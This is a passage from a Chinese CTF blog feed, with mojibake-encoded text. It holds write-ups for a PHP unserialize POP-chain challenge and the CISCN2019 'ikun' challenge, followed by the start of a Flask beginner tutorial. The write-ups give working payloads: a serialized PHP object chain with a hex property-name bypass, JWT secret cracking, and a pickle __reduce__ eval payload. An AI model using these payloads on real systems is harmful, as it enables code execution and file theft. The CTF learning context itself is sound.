ï¼ŒæŒ‘é‡ç‚¹çœ‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">player</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$user</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token variable">$pass</span><span class="token punctuation">,</span> <span class="token variable">$admin</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span> <span class="token operator">=</span> <span class="token variable">$user</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">pass</span> <span class="token operator">=</span> <span class="token variable">$pass</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span> <span class="token operator">=</span> <span class="token variable">$admin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">admin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">topsolo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Riven'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"function"</span> <span class="token keyword">or</span> <span class="token function">gettype</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"object"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">;</span>            <span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">midsolo</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"No Yasuo! No Soul!\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Are you orphan?\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Must Be Yasuo!\n"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">jungle</span><span class="token punctuation">&#123;</span>    <span class="token keyword">protected</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Lee Sin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">return</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">//topsolo->__destruct()->TP()->$name()->midsolo->__invoke()->Gank()->stristr($this->name, 'Yasuo')->jungle->__toString()->KS()</span><span class="token delimiter important">?></span></span></code></pre><p>é¢˜ç›®ç»™å‡ºäº†<code>cat /flag</code>çš„å‡½æ•°ï¼Œäºæ˜¯æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è§¦å‘è¯¥æ–¹æ³•å³å¯</p><p>åˆ†æååºåˆ—åŒ–é“¾ï¼š</p><pre class="language-php" data-language="php"><code class="language-php">topsolo<span class="token operator">-></span><span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">TP</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token variable">$name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">midsolo</span><span class="token operator">-></span><span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">Gank</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">name</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'Yasuo'</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token property">jungle</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-></span><span class="token function">KS</span><span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å…¶ä¸­æœ‰å‡ ä¸ªéœ€è¦ç»•è¿‡çš„ç‚¹ï¼š</p><p><code>__wakeup</code>å‡½æ•°ï¼Œè€è€ƒç‚¹äº†ï¼Œæ”¹å˜åºåˆ—åŒ–åçš„å¯¹è±¡å±æ€§å³å¯</p><p>è€Œåœ¨<code>common.php</code>ä¸­æœ‰ä¸ª<code>check</code>å‡½æ•°éœ€è¦ç»•è¿‡ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">check</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'name'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">False</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Name Pass\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$data</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><ul><li>è¿™é‡Œåˆ©ç”¨åå…­è¿›åˆ¶bypasså±æ€§åï¼Œå³<code>name-&gt;\6e\61\6d\65</code></li></ul><p>äºæ˜¯æ„é€ payloadï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">jungle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">midsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">topsolo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">-></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0\0*\0'</span><span class="token punctuation">;</span><span class="token variable">$pass</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'0";s:7:"\0*\0pass";O:7:"topsolo":1:&#123;S:7:"\0*\0\6e\61\6d\65";O:7:"midsolo":2:&#123;S:7:"\0*\0\6e\61\6d\65";O:6:"jungle":1:&#123;S:7:"\0*\0\6e\61\6d\65";s:7:"Lee Sin";&#125;&#125;&#125;&#125;;'</span><span class="token punctuation">;</span></code></pre><p>ä¼ å…¥å³å¯<code>cat /flag</code></p><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><h3 id="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2â€”ikun"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day1-Web2â€”ikun" class="headerlink" title="CISCN2019-ååŒ—èµ›åŒº-Day1-Web2â€”ikun"></a>CISCN2019-ååŒ—èµ›åŒº-Day1-Web2â€”ikun</h3><p>æ ¹æ®é¢˜ç›®æç¤ºéœ€è¦ä¹°åˆ°lv6çš„è´¦å·ï¼Œäºæ˜¯å†™è„šæœ¬æ‰¾</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://4882ba34-0c83-48c1-b876-e1b21efa6a68.node3.buuoj.cn/shop?page=&#123;&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"static/img/lv/lv6.png"</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>è·‘å‡ºlv6åœ¨<code>page=181</code>çš„é¡µé¢ï¼Œç‚¹å‡»è´­ä¹°é’±ä¸å¤Ÿï¼Œå‘ç°æœ‰æŠ˜æ‰£ï¼Œäºæ˜¯æŠ“åŒ…æ”¹æŠ˜æ‰£ä¸º0.0000001ï¼Œéšåæç¤ºéœ€è¦æ˜¯<code>admin</code>ï¼ŒæŠ“åŒ…æ³¨æ„åˆ°æœ‰ä¸€ä¸ª<code>jwt</code>çš„<code>cookie</code>ï¼Œ<a href="https://www.jianshu.com/p/576dbf44b2ae">å‚è€ƒ</a>ï¼Œè¿™é‡Œæœ‰ä¸€ä¸ªç¼–è§£ç <a href="https://jwt.io/#debugger-io">ç½‘ç«™</a>ï¼Œå†æ‰¾åˆ°çˆ†ç ´å¯†é’¥è„šæœ¬<a href="https://github.com/brendan-rius/c-jwt-cracker">ç½‘ç«™</a>ï¼Œè·‘å‡ºæ¥å¯†é’¥ä¸º<code>1kun</code>ï¼Œæ”¾åˆ°ç¼–ç ç½‘ç«™ç¼–ç åæºå¸¦è¿™ä¸ª<code>jwt</code>çš„<code>cookie</code>å‘åŒ…ï¼Œéšåæ¥åˆ°<code>b1g_m4mber</code>ç•Œé¢ï¼ŒæŸ¥çœ‹æºç å¾—åˆ°<code>www.zip</code>æºç åŒ…ï¼Œæ‰¾åˆ°å…³é”®åˆ©ç”¨çš„ä»£ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">from</span> sshop<span class="token punctuation">.</span>base <span class="token keyword">import</span> BaseHandler<span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">AdminHandler</span><span class="token punctuation">(</span>BaseHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>current_user <span class="token operator">==</span> <span class="token string">"admin"</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'no_ass.html'</span><span class="token punctuation">)</span>    <span class="token decorator annotation punctuation">@tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>authenticated</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token operator">*</span>args<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            become <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">'become'</span><span class="token punctuation">)</span>            p <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>become<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span>p<span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'form.html'</span><span class="token punctuation">,</span> res<span class="token operator">=</span><span class="token string">'This is Black Technology!'</span><span class="token punctuation">,</span> member<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span></code></pre><p>æ˜æ˜¾çš„pickleååºåˆ—åŒ–åˆ©ç”¨ï¼ŒPOSTçš„<code>become</code>ä¸ºåˆ©ç”¨ç‚¹ï¼Œéšåæ„é€ ååºåˆ—åŒ–åˆ©ç”¨pocï¼š</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token comment"># é¢˜ç›®æ˜¯åœ¨python2ç¯å¢ƒä¸‹ï¼Œéœ€è¦ç”¨python2è·‘</span><span class="token keyword">import</span> pickle<span class="token keyword">import</span> urllib<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token builtin">eval</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"open('/flag.txt','r').read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token builtin">eval</span>ç›´æ¥è¯»å–æ–‡ä»¶today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># print(pickle.dumps(today))</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> pickle<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>å¾—åˆ°payloadï¼š</p><pre class="language-python" data-language="python"><code class="language-python">c__builtin__<span class="token operator">%</span>0Aeval<span class="token operator">%</span>0Ap0<span class="token operator">%</span><span class="token number">0A</span><span class="token operator">%</span>28S<span class="token operator">%</span>22open<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">/</span>flag<span class="token punctuation">.</span>txt<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">2C</span><span class="token operator">%</span>27r<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29.</span>read<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span>0Ap1<span class="token operator">%</span>0Atp2<span class="token operator">%</span>0ARp3<span class="token operator">%</span><span class="token number">0A</span><span class="token punctuation">.</span></code></pre><p>ä¼ å…¥å‘åŒ…å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> python </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åˆè¯†Flask</title>
      <link href="posts/ebf6eea3/"/>
      <url>posts/ebf6eea3/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%88%9D%E8%AF%86Flask/flask-icon.png" alt loading="lazy"></p><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>Flaskæ˜¯ä¸€ä¸ªç”¨Pythonç¼–å†™çš„Webåº”ç”¨ç¨‹åºæ¡†æ¶ã€‚ å®ƒç”± <strong>Armin Ronacher</strong> å¼€å‘ï¼Œä»–é¢†å¯¼ä¸€ä¸ªåä¸ºPoccoçš„å›½é™…Pythonçˆ±å¥½è€…å›¢é˜Ÿã€‚ FlaskåŸºäºWerkzeug WSGIå·¥å…·åŒ…å’Œ<a href="http://docs.jinkan.org/docs/jinja2/">Jinja2</a>æ¨¡æ¿å¼•æ“ã€‚ä¸¤è€…éƒ½æ˜¯Poccoé¡¹ç›®ã€‚</p><p><a href="https://dormousehole.readthedocs.io/en/latest/">Flaskä¸­æ–‡æ–‡æ¡£</a></p><span id="more"></span><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><p>Python2.7åŠä»¥ä¸Šï¼ŒPython3.4åŠä»¥ä¸Šï¼Œæˆ‘è¿™é‡Œç”¨çš„Python2.7</p><p><strong>å®‰è£…virtualenv</strong></p><p>virtualenvå¯ä»¥åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„pythonè¿è¡Œç¯å¢ƒï¼Œè¿™ä¸ªç¯å¢ƒå’Œç³»ç»Ÿçš„pythonç¯å¢ƒæ˜¯äº’ä¸å¹²æ‰°çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ä½ åœ¨è¿™ä¸ªç¯å¢ƒä¸­å®‰è£…çš„pythonåŒ…ä¸ä¼šå®‰è£…åˆ°ç³»ç»Ÿçš„pythonç¯å¢ƒä¸­ï¼Œç³»ç»Ÿpythonç¯å¢ƒä¸­çš„åŒ…ä¼šå¤åˆ¶åˆ°è¿™ä¸ªç¯å¢ƒä¸­ï¼ˆä½†æ–°ç‰ˆæœ¬çš„virtualenvå¹¶ä¸ä¼šå¤åˆ¶è¿‡æ¥ï¼Œé»˜è®¤åªå®‰è£…<code>setuptools</code>ï¼Œ<code>wheel</code>å’Œ<code>pip</code>ï¼‰</p><p>å½“ç„¶å¦‚æœä¸æƒ³ç”¨ç³»ç»Ÿçš„åŒ…çš„è¯å¯ä»¥åŠ ä¸€äº›å‚æ•°ï¼š</p><p><code>â€“-no-site-packages</code>ï¼šè¡¨ç¤ºåœ¨å»ºç«‹è™šæ‹Ÿç¯å¢ƒæ—¶ä¸å°†åŸç‰ˆæœ¬ä¸­çš„ç¬¬ä¸‰æ–¹åº“æ‹·è´è¿‡æ¥ï¼Œè¿™æ ·å°±èƒ½è·å¾—ä¸€ä¸ªçº¯å‡€çš„Pythonç¯å¢ƒã€‚ï¼ˆå¯è¿™ä¸ªå‚æ•°æ–°ç‰ˆçš„virtualenvå¥½åƒç”¨ä¸äº†ï¼Œæˆ‘çš„å°±æ˜¯è¿™æ ·ï¼Œä½†ç½‘ä¸Šéƒ½è¿™æ ·è®²ï¼Œ=.=ï¼‰</p><p><code>--no-setuptools</code>ï¼šä¸å®‰è£…setuptoolsï¼›<code>--no-wheel</code>ï¼šä¸å®‰è£…whellï¼›<code>--no-pip</code>ï¼šä¸å®‰è£…pip</p><p>å®‰è£…virtualenvåŒ…ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">pip <span class="token function">install</span> virtualenv</code></pre><p>åˆ›å»ºç¯å¢ƒï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkdir</span> Flask  <span class="token comment">#åˆ›å»ºé¡¹ç›®ç›®å½•</span><span class="token builtin class-name">cd</span> Flaskvirtualenv -p C:<span class="token punctuation">\</span>Python2<span class="token punctuation">\</span>python.exe E:<span class="token punctuation">\</span>flask<span class="token punctuation">\</span>venv  <span class="token comment">#åœ¨è¿™ä¸ªé¡¹ç›®ä¸­åˆ›å»ºä¸€ä¸ªç‹¬ç«‹çš„pythonç¯å¢ƒï¼Œç¯å¢ƒå‘½åä¸ºvenvï¼Œ-pè¡¨ç¤ºæŒ‡å®špythonçš„ç‰ˆæœ¬è·¯å¾„</span>.<span class="token punctuation">\</span>venv<span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>activate  <span class="token comment">#å¯åŠ¨è™šæ‹Ÿç¯å¢ƒ;deactivateå¯é€€å‡ºæ­¤ç¯å¢ƒ</span></code></pre><p>æ¥ä¸‹æ¥å°±è¦åœ¨è¿™ä¸ªè™šæ‹Ÿç¯å¢ƒä¸­å®‰è£…Flaskäº†</p><pre class="language-shell" data-language="shell"><code class="language-shell">E:<span class="token punctuation">\</span>flask<span class="token punctuation">\</span>venv<span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>python.exe -m pip list  <span class="token comment">#å¯çœ‹åˆ°å½“å‰è™šæ‹Ÿç¯å¢ƒä¸­çš„æ‰€æœ‰çš„pythonåŒ…ï¼Œå½“ç„¶ä¸åŠ è·¯å¾„ä¹Ÿå¯ä»¥</span>pip <span class="token function">install</span> Flask</code></pre><p>è‡³æ­¤è™šæ‹Ÿç¯å¢ƒå°±æ­å»ºæˆåŠŸäº†ï¼Œå½“ç„¶å¦‚æœä½ ä¸æƒ³ç”¨è™šæ‹Ÿçš„pythonç¯å¢ƒç”¨ç³»ç»Ÿè‡ªå¸¦çš„ä¹Ÿå¯ä»¥</p><h2 id="åº”ç”¨"><a href="#åº”ç”¨" class="headerlink" title="åº”ç”¨"></a>åº”ç”¨</h2><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask <span class="token comment">#å¯¼å…¥Flaskæ¨¡å—</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token comment">#ä½¿ç”¨å½“å‰æ¨¡å—ä½œä¸ºå‚æ•°</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token string">'Hello World'</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span></code></pre><p><code>app.route(rule, 